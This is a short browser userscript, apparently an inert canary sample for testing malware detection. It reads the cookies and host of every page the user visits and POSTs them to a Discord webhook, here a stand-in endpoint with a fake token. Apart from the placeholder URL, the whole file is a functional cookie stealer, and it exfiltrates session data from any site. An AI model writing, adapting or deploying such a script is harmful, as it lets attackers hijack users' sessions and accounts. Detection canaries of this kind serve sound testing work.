// ==UserScript==
// @name         mal cookie webhook
// @namespace    canary.invalid
// @version      1.0
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @connect      *
// ==/UserScript==
(function(){ // INERT CANARY: fake webhook id/token, not a real endpoint
  const c = document.cookie;
  GM_xmlhttpRequest({method:"POST", url:"https://discord.com/api/webhooks/00000/CANARY_not_a_real_token_xxxx", data: JSON.stringify({c, u: location.host})});
})();
